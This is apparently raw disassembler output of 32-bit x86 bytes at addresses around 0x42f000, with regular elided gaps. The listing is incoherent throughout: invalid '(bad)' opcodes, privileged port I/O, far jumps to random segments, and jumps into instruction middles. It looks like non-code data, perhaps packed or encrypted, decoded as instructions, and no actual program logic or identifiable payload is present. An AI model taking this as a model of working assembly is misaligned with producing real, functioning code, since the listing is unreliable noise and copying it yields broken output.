  42f023:	xchg   bp,ax
  42f025:	ins    BYTE PTR es:[edi],dx
  42f026:	addr16 push edi
  42f028:	xchg   ebp,eax
  42f029:	mov    cl,0x21
  42f02b:	cmp    BYTE PTR [edi],al
  42f02d:	dec    ebx
  42f02e:	ds push ebx
  42f030:	sbb    edi,DWORD PTR [esi+0x6a]
  42f033:	pop    ds
  42f034:	fcmovnb st,st(5)
  42f036:	ins    DWORD PTR es:[edi],dx
  42f037:	cmp    ah,BYTE PTR [eax]
  42f039:	idiv   BYTE PTR [ebp+0x5c77fe21]
  42f03f:	push   edi
  42f040:	fdiv   QWORD PTR [edx]
  42f042:	adc    bl,BYTE PTR [ebp+0x7d]
  42f045:	cmc    
  42f046:	stc    
  42f047:	sub    al,0x48
  42f049:	pop    edx
  42f04a:	push   ds
  42f04b:	jp     0x42f05c
  42f04d:	in     al,0x53
  42f04f:	xchg   esp,eax
  42f050:	enter  0xd7f,0x7b
  42f054:	test   al,dl
  42f056:	bound  edx,QWORD PTR [edi-0x43]
  42f059:	fdivr  DWORD PTR [edx+esi*4-0x48d934d1]
  42f060:	sub    ch,BYTE PTR [ebx]
  42f062:	aaa    
  42f063:	pop    edx
  42f064:	lods   eax,DWORD PTR ds:[esi]
  42f065:	std    
  42f066:	dec    ebp
  42f067:	or     al,0x78
  42f069:	add    bh,BYTE PTR [ebx]
  42f06b:	mov    edx,0xd898
	...
  42f0d4:	add    BYTE PTR [eax],al
  42f0d6:	adc    bh,BYTE PTR [esi]
  42f0d8:	int    0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42f0e4:	dec    ecx
  42f0e5:	mov    edx,0x1f867
  42f0ea:	add    BYTE PTR [ecx],al
  42f0ec:	add    BYTE PTR [eax],al
  42f0ee:	inc    eax
  42f0ef:	ficom  DWORD PTR [ebx+0x705dee41]
  42f0f5:	push   esp
  42f0f6:	or     al,0x3b
  42f0f8:	dec    eax
  42f0f9:	ds sti 
  42f0fb:	mov    bl,0x4d
  42f0fd:	leave  
  42f0fe:	mov    DWORD PTR es:[esi+0x66],esp
  42f102:	mov    al,0xdf
  42f104:	icebp  
  42f105:	cli    
  42f106:	mov    DWORD PTR [esi+0x19],0x19bddb23
  42f10d:	xchg   BYTE PTR [edx+edi*1],dh
  42f110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f111:	lods   al,BYTE PTR ds:[esi]
  42f112:	jno    0x42f0e7
  42f114:	dec    eax
  42f115:	sbb    edx,DWORD PTR [ebp-0x68da9ccd]
  42f11b:	scas   al,BYTE PTR es:[edi]
  42f11c:	cmp    eax,DWORD PTR [edx-0x6456d330]
  42f122:	add    ebx,esi
  42f124:	inc    ebp
  42f125:	mov    BYTE PTR [ecx-0x30e5dc41],bh
  42f12b:	(bad)
  42f12e:	mov    ah,0x1c
  42f130:	or     bh,BYTE PTR [ecx+0x4c]
  42f133:	test   bl,bl
  42f135:	mov    esi,0x80776cd0
  42f13a:	call   0x2ec9b6f
  42f13f:	push   cs
  42f140:	and    esi,DWORD PTR [ebx+0x18]
  42f143:	and    DWORD PTR [esp+ecx*1+0x3f],edx
  42f147:	addr16 push ebx
  42f149:	retf   
  42f14a:	lods   al,BYTE PTR ds:[esi]
  42f14b:	shl    DWORD PTR [edx+0x33],cl
  42f14e:	shl    DWORD PTR [ebp-0x23276423],cl
  42f154:	fldcw  WORD PTR [edx]
  42f156:	fist   DWORD PTR ds:0xcf1e94e0
  42f15c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f15d:	loop   0x42f163
  42f15f:	(bad)  
  42f160:	xor    eax,0xa485cb35
  42f165:	xchg   ebp,eax
  42f166:	sub    al,dl
  42f168:	in     eax,dx
  42f169:	stos   BYTE PTR es:[edi],al
  42f16a:	cmp    al,0xb8
  42f16c:	add    BYTE PTR [esi+0xdb94d41],0xd2
  42f173:	cmc    
  42f174:	ins    DWORD PTR es:[edi],dx
  42f175:	xor    ah,BYTE PTR [eax+0x37dabbcf]
  42f17b:	gs push ebx
  42f17d:	and    eax,0xa625880f
  42f182:	out    dx,ax
  42f184:	jle    0x42f151
  42f186:	xor    eax,0xeaa9e4f2
  42f18b:	and    esi,ecx
  42f18d:	shl    BYTE PTR ds:0x615f09f2,1
  42f193:	jmp    0x1589:0x41a0449a
  42f19a:	call   0x8bb1:0x76e7c785
  42f1a1:	sub    dl,bl
  42f1a3:	xchg   ecx,eax
  42f1a4:	popa   
  42f1a5:	lahf   
  42f1a6:	push   ebp
  42f1a7:	mov    ebx,0x92c8e65d
  42f1ac:	mov    bl,0x84
  42f1ae:	cmp    BYTE PTR ds:0xc6b81355,0x86
  42f1b5:	stos   DWORD PTR es:[edi],eax
  42f1b6:	inc    ebp
  42f1b7:	sub    DWORD PTR [ebp-0x23],0x73
  42f1bb:	jecxz  0x42f176
  42f1bd:	xchg   ebp,eax
  42f1be:	adc    DWORD PTR [eax-0x33119a7a],ecx
  42f1c4:	push   cs
  42f1c5:	mov    es,WORD PTR [esi+0x4e2043e1]
  42f1cb:	out    dx,eax
  42f1cc:	mov    cl,0x89
  42f1ce:	pop    ebx
  42f1cf:	sub    eax,0xa556ce58
  42f1d4:	inc    ebx
  42f1d5:	xchg   edx,eax
  42f1d6:	push   cs
  42f1d7:	les    edi,FWORD PTR [ebx+eax*8+0x52]
  42f1db:	xchg   DWORD PTR [ebp+0x1d9e45f4],edi
  42f1e1:	push   edi
  42f1e2:	neg    DWORD PTR [edx]
  42f1e4:	or     bh,dh
  42f1e6:	jmp    0x42f1c3
  42f1e8:	cli    
  42f1e9:	mov    al,ds:0xd976ab88
	...
  42f256:	pop    edx
  42f257:	es jecxz 0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	scas   al,BYTE PTR es:[edi]
  42f263:	stc    
  42f264:	inc    ebx
  42f265:	dec    esp
  42f266:	addr16 stc 
  42f268:	add    DWORD PTR [eax],eax
  42f26a:	add    BYTE PTR [ecx],al
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	mov    edx,0x86c46876
  42f273:	adc    bh,BYTE PTR [eax]
  42f275:	cli    
  42f276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f277:	inc    ebp
  42f278:	jmp    0x3374:0xad0862f5
  42f27f:	icebp  
  42f280:	ins    BYTE PTR es:[edi],dx
  42f281:	stc    
  42f282:	sub    BYTE PTR [esi*4-0x317ee068],bh
  42f289:	sbb    dl,BYTE PTR [ebx-0x69]
  42f28c:	int    0x9a
  42f28e:	mov    edx,0x68b5d461
  42f293:	mov    ds:0x58247cf0,al
  42f298:	xor    DWORD PTR [eax+eax*2],esi
  42f29b:	clc    
  42f29c:	cmp    esi,DWORD PTR [ecx-0x6f]
  42f29f:	and    al,BYTE PTR [edi]
  42f2a1:	cli    
  42f2a2:	outs   dx,BYTE PTR ds:[esi]
  42f2a3:	push   0xffffffe9
  42f2a5:	mov    BYTE PTR [edx+0x452725fc],ah
  42f2ab:	jbe    0x42f2dd
  42f2ad:	xchg   DWORD PTR [ecx-0x47c8b9a4],ebp
  42f2b3:	mov    esp,0xa1e1f02d
  42f2b8:	mov    al,0x56
  42f2ba:	test   eax,0xff8c2d36
  42f2bf:	jmp    0x20422397
  42f2c4:	adc    ebp,DWORD PTR [esp+ebx*8-0x43]
  42f2c8:	fild   DWORD PTR [esi+0x78]
  42f2cb:	sbb    bl,BYTE PTR [edi+0x37]
  42f2ce:	imul   eax,DWORD PTR [ebx-0x5857eab3],0x2aadb2a2
  42f2d8:	(bad)  
  42f2d9:	jns    0x42f347
  42f2db:	add    DWORD PTR [eax-0x1a311834],edx
  42f2e1:	and    dl,BYTE PTR [eax+edx*8]
  42f2e4:	daa    
  42f2e5:	idiv   DWORD PTR [ebp-0x543904b4]
  42f2eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f2ec:	rcl    DWORD PTR [ebx+0x7],cl
  42f2ef:	mov    esi,DWORD PTR [ebx-0x7c]
  42f2f2:	adc    al,0xe6
  42f2f4:	lods   eax,DWORD PTR ds:[esi]
  42f2f5:	ror    DWORD PTR [esi-0x50],1
  42f2f8:	fs cli 
  42f2fa:	ins    BYTE PTR es:[edi],dx
  42f2fb:	xchg   esp,eax
  42f2fc:	sub    esi,DWORD PTR [edx+ebx*4+0x4e0349b9]
  42f303:	push   ds
  42f304:	mov    gs,WORD PTR [edi-0x7f1c1341]
  42f30a:	call   0xf46b8055
  42f30f:	out    0xc2,eax
  42f311:	(bad)  
  42f312:	xchg   BYTE PTR [ecx],ah
  42f314:	lock dec edi
  42f316:	test   eax,0x7052e283
  42f31b:	out    0x89,eax
  42f31d:	std    
  42f31e:	add    al,0x87
  42f320:	pop    esp
  42f321:	int3   
  42f322:	add    esp,ebp
  42f324:	jo     0x42f2b0
  42f326:	arpl   WORD PTR [ecx-0x22e8536],cx
  42f32c:	cmp    esi,DWORD PTR [ecx-0x3]
  42f32f:	and    edi,edx
  42f331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f332:	mov    al,ds:0x510a30ed
  42f337:	mov    WORD PTR [ebx-0x5b],es
  42f33a:	scas   al,BYTE PTR es:[edi]
  42f33b:	imul   esi,DWORD PTR [eax+ebx*1-0x2e],0x3b64f508
  42f343:	mov    edi,0x799263a3
  42f348:	stos   BYTE PTR es:[edi],al
  42f349:	test   BYTE PTR [edx+0x28ec33e8],dl
  42f34f:	jl     0x42f2fc
  42f351:	idiv   BYTE PTR [edi-0x64]
  42f354:	jnp    0x42f3d1
  42f356:	sbb    eax,0x3928e9a1
  42f35b:	pop    edx
  42f35c:	es push ds
  42f35e:	mov    ecx,DWORD PTR [edi+0x63]
  42f361:	dec    edx
  42f362:	and    DWORD PTR [ecx],ecx
  42f364:	fmulp  st(5),st
  42f366:	fstp   QWORD PTR [esi-0x4a3f0cbf]
  42f36c:	add    esi,DWORD PTR [ecx+0x0]
	...
  42f3d3:	add    BYTE PTR [eax],al
  42f3d5:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	or     BYTE PTR [ecx-0x58],0x19
  42f3e6:	addr16 cli 
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	add    BYTE PTR [ecx],al
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	xor    DWORD PTR [eax],ebp
  42f3f0:	adc    DWORD PTR [ebx],edi
  42f3f2:	cmp    ah,ah
  42f3f4:	ins    BYTE PTR es:[edi],dx
  42f3f5:	dec    esp
  42f3f6:	cmc    
  42f3f7:	xchg   edi,eax
  42f3f8:	or     bl,bl
  42f3fa:	aad    0x0
  42f3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3fd:	sbb    DWORD PTR [edx-0x6ad33994],eax
  42f403:	test   dl,bh
  42f405:	imul   eax,DWORD PTR [ebx],0xffffff9a
  42f408:	in     eax,0xe
  42f40a:	popf   
  42f40b:	fisubr WORD PTR [edi]
  42f40d:	repnz sub BYTE PTR [eax],ah
  42f410:	mov    dh,0xc
  42f412:	dec    ecx
  42f413:	jne    0x42f414
  42f415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f416:	xchg   ebp,eax
  42f417:	adc    bh,dh
  42f419:	and    cx,WORD PTR [edx+0x746c6692]
  42f420:	and    eax,DWORD PTR [eax+ebx*1-0x17671341]
  42f427:	sub    DWORD PTR ds:0xd58f74c9,eax
  42f42d:	fisub  WORD PTR [edx]
  42f42f:	data16 in al,0xbb
  42f432:	jl     0x42f3bd
  42f434:	fcmovnb st,st(3)
  42f436:	lahf   
  42f437:	pop    esi
  42f438:	inc    ebp
  42f439:	jne    0x42f46e
  42f43b:	add    BYTE PTR [ecx],ah
  42f43d:	cmp    ah,BYTE PTR [eax+0x6457c2df]
  42f443:	stc    
  42f444:	mov    edi,0x93db242
  42f449:	xor    ebp,DWORD PTR [ecx+eax*8-0x59f195c]
  42f450:	mov    ch,0xea
  42f452:	aas    
  42f453:	lock es hlt 
  42f456:	cs test eax,0x194c21a6
  42f45c:	pop    ss
  42f45d:	sub    BYTE PTR [ebp+0x72],0xed
  42f461:	scas   al,BYTE PTR es:[edi]
  42f462:	mov    ?,WORD PTR [edx]
  42f464:	loope  0x42f4dc
  42f466:	xchg   esp,ecx
  42f468:	fsubr  QWORD PTR cs:[esi]
  42f46b:	and    esi,ebp
  42f46d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f46e:	fld    st(3)
  42f470:	jno    0x42f42f
  42f472:	ja     0x42f478
  42f474:	mov    eax,ds:0x43e8ec0f
  42f479:	fild   WORD PTR [edx+0x7]
  42f47c:	test   BYTE PTR [esi-0x550e4f5d],bh
  42f482:	pushf  
  42f483:	xchg   BYTE PTR [ecx+edx*2+0x1859456e],dh
  42f48a:	and    al,0x71
  42f48c:	or     DWORD PTR [eax-0x75],ebx
  42f48f:	xor    eax,0x7b332a1e
  42f494:	inc    eax
  42f495:	jmp    DWORD PTR [ecx]
  42f497:	mov    esi,0xab011422
  42f49c:	fstp   DWORD PTR [ecx-0x6fcabb7d]
  42f4a2:	rcl    al,cl
  42f4a4:	retf   0x3f20
  42f4a7:	and    eax,ebx
  42f4a9:	mov    ds:0x127cda0f,al
  42f4ae:	ss cmp al,0x7e
  42f4b1:	cdq    
  42f4b2:	sbb    cl,BYTE PTR [esi+0x214be072]
  42f4b8:	int3   
  42f4b9:	inc    esi
  42f4ba:	sahf   
  42f4bb:	cmp    bl,BYTE PTR [esi-0x39]
  42f4be:	pop    ebp
  42f4bf:	dec    edx
  42f4c0:	jns    0x42f4f8
  42f4c2:	adc    ch,BYTE PTR [esi+0x29]
  42f4c5:	jecxz  0x42f4ea
  42f4c7:	adc    ch,BYTE PTR [edi+ecx*1+0x39170b1f]
  42f4ce:	aad    0x8a
  42f4d0:	pop    ss
  42f4d1:	ins    DWORD PTR es:[edi],dx
  42f4d2:	mov    ah,0x7e
  42f4d4:	dec    ebp
  42f4d5:	mov    dl,0x43
  42f4d7:	xchg   DWORD PTR [ebp+0xf],ecx
  42f4da:	loop   0x42f464
  42f4dc:	mov    esp,0xf2275a32
  42f4e1:	ds test al,0xac
  42f4e4:	int    0xe1
  42f4e6:	icebp  
  42f4e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f4e8:	mov    ebx,0x85b7a690
  42f4ed:	scas   al,BYTE PTR es:[edi]
	...
  42f556:	aaa    
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	sbb    al,0x82
  42f564:	adc    DWORD PTR [edi+eiz*2+0x1fb],eax
  42f56b:	add    DWORD PTR [eax],eax
  42f56d:	add    cl,ch
  42f56f:	sub    BYTE PTR [edx+0xa],dh
  42f572:	sahf   
  42f573:	mov    ebx,0x46161b2d
  42f578:	rcl    BYTE PTR [esi+0x339ea8b9],1
  42f57e:	push   esp
  42f57f:	sbb    ecx,DWORD PTR [ebx+0x5c]
  42f582:	(bad)  
  42f583:	retf   
  42f584:	test   al,0x1
  42f586:	add    esp,DWORD PTR ds:0xcfc0f0c3
  42f58c:	xor    bl,BYTE PTR [ecx+0x3dc395bf]
  42f592:	or     al,0x61
  42f594:	mov    edi,0xf59c5b8c
  42f599:	aam    0xb1
  42f59b:	xchg   ebp,eax
  42f59c:	sbb    dh,BYTE PTR [edi]
  42f59e:	outs   dx,DWORD PTR ds:[esi]
  42f59f:	cli    
  42f5a0:	fadd   st,st(6)
  42f5a2:	adc    dh,al
  42f5a4:	lods   al,BYTE PTR ds:[esi]
  42f5a5:	cmp    al,BYTE PTR ds:0x7a474c26
  42f5ab:	aaa    
  42f5ac:	or     eax,0x247cbd33
  42f5b1:	xor    al,0xf0
  42f5b3:	xor    BYTE PTR [ecx],cl
  42f5b5:	shrd   DWORD PTR [ecx],esi,cl
  42f5b8:	lea    ecx,[edx]
  42f5ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f5bb:	sub    eax,0xf7c119b4
  42f5c0:	mov    ss,WORD PTR [edx+0x3b0179f0]
  42f5c6:	rol    BYTE PTR [ecx],0x4c
  42f5c9:	retf   0x8d63
  42f5cc:	xchg   esp,eax
  42f5cd:	jno    0x42f642
  42f5cf:	mov    edi,0x99c8d410
  42f5d4:	push   ebp
  42f5d5:	mov    dl,0x98
  42f5d7:	add    al,ah
  42f5d9:	dec    edx
  42f5da:	mov    ebp,DWORD PTR [ecx-0x1a]
  42f5dd:	mov    dl,0xf7
  42f5df:	jmp    0x42f60c
  42f5e1:	xor    ah,BYTE PTR [ebx]
  42f5e3:	jo     0x42f5cc
  42f5e5:	fsub   DWORD PTR [esi+0x5d1c74df]
  42f5eb:	lock xor dh,BYTE PTR [eax+0x7f]
  42f5ef:	sbb    esi,DWORD PTR [esi]
  42f5f1:	lea    ebp,[eax-0x29]
  42f5f4:	fs test eax,0x269e3675
  42f5fa:	xchg   ecx,eax
  42f5fb:	cmovg  esi,ebx
  42f5fe:	popf   
  42f5ff:	fstp   TBYTE PTR ds:0x59c85ad9
  42f605:	pop    ebx
  42f606:	into   
  42f607:	mov    esp,0x70165be5
  42f60c:	fisub  DWORD PTR [ebp-0x37]
  42f60f:	ret    0xc0fc
  42f612:	dec    eax
  42f613:	lea    ebx,[ecx]
  42f615:	and    BYTE PTR [edi],al
  42f617:	add    dh,bh
  42f619:	test   DWORD PTR [ecx],edx
  42f61b:	inc    ebp
  42f61c:	aam    0xb
  42f61e:	sub    al,0xe7
  42f620:	lock stc 
  42f622:	and    al,0xfc
  42f624:	inc    ebp
  42f625:	ret    
  42f626:	dec    eax
  42f627:	or     dh,BYTE PTR [edx]
  42f629:	js     0x42f5dd
  42f62b:	lahf   
  42f62c:	outs   dx,BYTE PTR ds:[esi]
  42f62d:	ret    0x856b
  42f630:	dec    edi
  42f631:	push   edx
  42f632:	repz aas 
  42f634:	stos   DWORD PTR es:[edi],eax
  42f635:	sahf   
  42f636:	inc    ecx
  42f637:	mov    edx,0x4f320e60
  42f63c:	dec    ebp
  42f63d:	cdq    
  42f63e:	lods   al,BYTE PTR ds:[esi]
  42f63f:	xchg   esi,eax
  42f640:	and    bl,ah
  42f642:	test   eax,0xdac51849
  42f647:	call   0xf016:0xb88f9c17
  42f64e:	pop    es
  42f64f:	sub    eax,0xdb682b0a
  42f654:	xchg   edi,eax
  42f655:	imul   ebp,ecx,0xb55a93f7
  42f65b:	cld    
  42f65c:	sub    al,0x56
  42f65e:	shl    DWORD PTR ds:0xc41b0723,0x4e
  42f665:	sar    BYTE PTR [ebx+0x6b],0x3f
  42f669:	bound  edi,QWORD PTR [esi+0xc783a2]
	...
  42f6d3:	add    BYTE PTR [eax],al
  42f6d5:	add    BYTE PTR [esi],bh
  42f6d7:	push   esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	adc    DWORD PTR [ebp-0x3981873],esi
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	add    BYTE PTR [ecx],al
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	sub    eax,0x88143752
  42f6f3:	mov    bl,0x36
  42f6f5:	into   
  42f6f6:	mov    edx,0xe4ee8f62
  42f6fb:	mov    esi,0xea46b099
  42f700:	push   0xfed52d9e
  42f705:	punpckldq mm7,DWORD PTR [ebx]
  42f708:	ret    0x6646
  42f70b:	add    BYTE PTR [ebx+ebx*1-0x48],cl
  42f70f:	ja     0x42f6e4
  42f711:	xchg   edx,edi
  42f713:	and    dl,BYTE PTR [edx-0x622d676b]
  42f719:	mov    eax,0x9c24f1cd
  42f71e:	push   ds
  42f71f:	es in  al,dx
  42f721:	mov    edx,0xa9f0e788
  42f726:	adc    bh,BYTE PTR ds:0x8fbfd696
  42f72c:	sbb    ecx,DWORD PTR [edi+0x8]
  42f72f:	ins    BYTE PTR es:[edi],dx
  42f730:	dec    esi
  42f731:	addr16 mov dh,0xc6
  42f734:	loope  0x42f741
  42f736:	das    
  42f737:	retf   
  42f738:	cmc    
  42f739:	call   0x8634:0xd784b9d2
  42f740:	mov    gs,WORD PTR [edx]
  42f742:	cmp    al,0x84
  42f744:	add    edi,DWORD PTR es:[ebx]
  42f747:	pop    ebp
  42f748:	inc    edx
  42f749:	imul   edx,DWORD PTR [eax],0x51
  42f74c:	js     0x42f74a
  42f74e:	push   0xffffffe7
  42f750:	popf   
  42f751:	sti    
  42f752:	and    dh,ch
  42f754:	fnsave [edi-0x7]
  42f757:	out    dx,eax
  42f758:	xchg   DWORD PTR ds:0x9bcd69df,edx
  42f75e:	fnstcw WORD PTR [eax]
  42f760:	or     al,0x46
  42f762:	sub    DWORD PTR [esp+ecx*8-0x14f6a906],esp
  42f769:	inc    ebx
  42f76a:	jmp    0x42f719
  42f76c:	cmp    al,0x65
  42f76e:	push   ss
  42f76f:	add    BYTE PTR [ecx-0x63],bh
  42f772:	inc    edx
  42f773:	jge    0x42f704
  42f775:	mov    eax,ds:0x9e14b7d3
  42f77a:	mov    dh,BYTE PTR [edx]
  42f77c:	pop    esi
  42f77d:	push   0x76e9cccb
  42f782:	sbb    eax,0x668ee703
  42f787:	mov    eax,0x3a502e1f
  42f78c:	mov    DWORD PTR [ebx-0x405aa53e],0xabc9c4a
  42f796:	mov    eax,ds:0xc4574561
  42f79b:	leave  
  42f79c:	fsubr  st,st(5)
  42f79e:	lods   eax,DWORD PTR ds:[esi]
  42f79f:	push   ds
  42f7a0:	loopne 0x42f7f3
  42f7a2:	mov    al,0xf2
  42f7a4:	scas   al,BYTE PTR es:[edi]
  42f7a5:	sub    bh,BYTE PTR [edi+0x5e]
  42f7a8:	inc    edi
  42f7a9:	adc    BYTE PTR [ecx+eax*4],0xe1
  42f7ad:	mov    ecx,DWORD PTR ds:0xfb9d366a
  42f7b3:	xor    ah,dl
  42f7b5:	fstp   QWORD PTR [edi-0x50]
  42f7b8:	hlt    
  42f7b9:	aam    0xb0
  42f7bb:	mov    esi,0xa0ed6c8f
  42f7c0:	pop    ebx
  42f7c1:	scas   al,BYTE PTR es:[edi]
  42f7c2:	xor    esi,edi
  42f7c4:	aam    0x44
  42f7c6:	out    dx,al
  42f7c7:	push   esi
  42f7c8:	test   al,0x80
  42f7ca:	inc    esi
  42f7cb:	pop    ebp
  42f7cc:	fisttp DWORD PTR [esp+ecx*2]
  42f7cf:	add    ebx,DWORD PTR [eiz*4-0x386f6ef7]
  42f7d6:	repz dec esp
  42f7d8:	retf   0xfefb
  42f7db:	sub    eax,0x8b56937b
  42f7e0:	sahf   
  42f7e1:	cmc    
  42f7e2:	call   0xc5b98eec
  42f7e7:	cmp    eax,0x69d356e
  42f7ec:	mov    ah,0xe
	...
  42f856:	jno    0x42f7f9
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0xdcf63212
  42f866:	addr16 std 
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	add    BYTE PTR [ecx],al
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	push   ebp
  42f86f:	dec    ebp
  42f870:	mov    BYTE PTR [eax-0x20],bh
  42f873:	jg     0x42f8b9
  42f875:	and    DWORD PTR [edx],edi
  42f877:	jmp    0xee9bedd2
  42f87c:	pop    esp
  42f87d:	mov    cl,0x1a
  42f87f:	loopne 0x42f857
  42f881:	mov    al,ds:0x1a365b
  42f886:	mov    eax,0x5f317d37
  42f88b:	xchg   bp,ax
  42f88d:	call   0xb33:0xe011bacb
  42f894:	push   ss
  42f895:	stc    
  42f896:	sahf   
  42f897:	scas   al,BYTE PTR es:[edi]
  42f898:	push   ss
  42f899:	rol    BYTE PTR ds:0xb7c57c7e,1
  42f89f:	lds    ebp,FWORD PTR [edi-0x24de768e]
  42f8a5:	mov    BYTE PTR ds:0xa5abfd0d,dl
  42f8ab:	sub    ebp,ecx
  42f8ad:	arpl   WORD PTR [ebp-0x79],di
  42f8b0:	mov    bl,0xe5
  42f8b2:	stos   DWORD PTR es:[edi],eax
  42f8b3:	mov    eax,0x703ce1df
  42f8b8:	dec    ecx
  42f8b9:	cmp    BYTE PTR [eax],0xa1
  42f8bc:	inc    esp
  42f8bd:	inc    esp
  42f8be:	or     ebx,eax
  42f8c0:	ins    DWORD PTR es:[edi],dx
  42f8c1:	mov    eax,0x47a3d808
  42f8c6:	loope  0x42f8d8
  42f8c8:	mov    eax,0x6f8f871b
  42f8cd:	sub    ebp,DWORD PTR [edx+0x67]
  42f8d0:	dec    ebp
  42f8d1:	mul    eax
  42f8d3:	mov    dl,0xbe
  42f8d5:	imul   esp,eax,0xb61a27e2
  42f8db:	retf   
  42f8dc:	adc    BYTE PTR [edx+0x4],0xf1
  42f8e0:	pop    eax
  42f8e1:	xor    ecx,DWORD PTR [ecx-0x73d9f272]
  42f8e7:	retf   
  42f8e8:	sub    eax,0x6277883f
  42f8ed:	dec    edi
  42f8ee:	outs   dx,BYTE PTR ds:[esi]
  42f8ef:	ret    0x483b
  42f8f2:	dec    edi
  42f8f3:	mov    ah,0xef
  42f8f5:	lods   al,BYTE PTR ds:[esi]
  42f8f6:	sub    DWORD PTR [edi+esi*8+0x7b],esp
  42f8fa:	loopne 0x42f894
  42f8fc:	xlat   BYTE PTR ds:[ebx]
  42f8fd:	(bad)  
  42f8fe:	fs mov ebp,0xe908eefb
  42f904:	mov    dh,0xd7
  42f906:	das    
  42f907:	imul   eax,DWORD PTR [ebp+0x38],0xffffff99
  42f90b:	adc    bx,dx
  42f90e:	out    dx,al
  42f90f:	jmp    0xb0504096
  42f914:	or     BYTE PTR [edx],0xcf
  42f917:	fstp   DWORD PTR [ebx]
  42f919:	(bad)  
  42f91a:	fwait
  42f91b:	pop    esp
  42f91c:	jp     0x42f8cd
  42f91e:	mov    edx,DWORD PTR [ebx-0x12]
  42f921:	or     al,0x8e
  42f923:	clc    
  42f924:	ins    DWORD PTR es:[edi],dx
  42f925:	(bad)  
  42f926:	(bad)  
  42f927:	cld    
  42f928:	add    dl,BYTE PTR [ebx+0x5715ce59]
  42f92e:	mov    ds:0x67c76a90,eax
  42f933:	out    0xcc,eax
  42f935:	into   
  42f936:	les    esp,FWORD PTR [ecx+edx*8]
  42f939:	dec    ah
  42f93b:	icebp  
  42f93c:	aam    0x61
  42f93e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f93f:	pop    es
  42f940:	push   ds
  42f941:	mov    cl,0xac
  42f943:	cli    
  42f944:	xchg   ecx,eax
  42f945:	outs   dx,DWORD PTR ds:[esi]
  42f946:	iret   
  42f947:	jb     0x42f9be
  42f949:	mov    ecx,0x60e3c8ed
  42f94e:	jnp    0x42f9cd
  42f950:	leave  
  42f951:	dec    edi
  42f952:	fidiv  DWORD PTR [ecx+ecx*2+0x4a981c5f]
  42f959:	std    
  42f95a:	push   edi
  42f95b:	xor    al,0x5f
  42f95d:	hlt    
  42f95e:	jb     0x42f97f
  42f960:	sbb    al,0xeb
  42f962:	dec    ebp
  42f963:	sub    ecx,DWORD PTR [ebp+0x15]
  42f966:	jp     0x42f903
  42f968:	adc    cl,0xe6
  42f96b:	jmp    0x433ec0
	...
  42f9d4:	add    BYTE PTR [eax],al
  42f9d6:	adc    al,0x74
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42fa5e
  42f9e3:	jge    0x42fa3b
  42f9e5:	shl    BYTE PTR [edi-0x2],cl
  42f9e8:	add    DWORD PTR [eax],eax
  42f9ea:	add    BYTE PTR [ecx],al
  42f9ec:	add    BYTE PTR [eax],al
  42f9ee:	jo     0x42fa23
  42f9f0:	xchg   edi,eax
  42f9f1:	xchg   esi,eax
  42f9f2:	ds dec eax
  42f9f4:	pop    esi
  42f9f5:	ss inc ecx
  42f9f7:	sub    al,0x55
  42f9f9:	xlat   BYTE PTR ds:[ebx]
  42f9fa:	sub    BYTE PTR [edx-0x54],ah
  42f9fd:	or     BYTE PTR [edi+0x2921f6f1],bh
  42fa03:	push   ss
  42fa04:	cs inc esi
  42fa06:	jge    0x42f988
  42fa08:	stos   BYTE PTR es:[edi],al
  42fa09:	sub    cl,BYTE PTR fs:[ecx]
  42fa0c:	jnp    0x42fa5d
  42fa0e:	jmp    DWORD PTR ds:0xd75104bb
  42fa14:	into   
  42fa15:	add    DWORD PTR [edi],0x57a5fff
  42fa1b:	xor    cl,bl
  42fa1d:	das    
  42fa1e:	mov    bl,0x37
  42fa20:	jle    0x42f9c9
  42fa22:	sub    al,0x1a
  42fa24:	sar    ch,0x87
  42fa27:	(bad)  
  42fa28:	cmp    edx,DWORD PTR [edi+0x64e74522]
  42fa2e:	ret    0x2c43
  42fa31:	les    edx,FWORD PTR [eax]
  42fa33:	and    cl,BYTE PTR ds:0xb9d7b9a5
  42fa39:	imul   BYTE PTR [esi]
  42fa3b:	mov    edi,DWORD PTR [ebx-0x3e]
  42fa3e:	ins    BYTE PTR es:[edi],dx
